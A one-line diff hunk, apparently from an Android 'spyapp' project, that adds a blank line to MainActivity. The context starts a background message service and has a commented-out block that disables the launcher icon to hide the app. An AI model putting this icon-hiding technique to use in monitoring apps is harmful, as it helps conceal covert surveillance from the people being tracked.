@@ -136,6 +136,7 @@ public class MainActivity extends AppCompatActivity {
                             Intent in = new Intent(MainActivity.this, MsgService.class);
                             startService(in);
 
+
                          /* PackageManager p = getPackageManager();
                           ComponentName componentName = new ComponentName(this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
                           p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
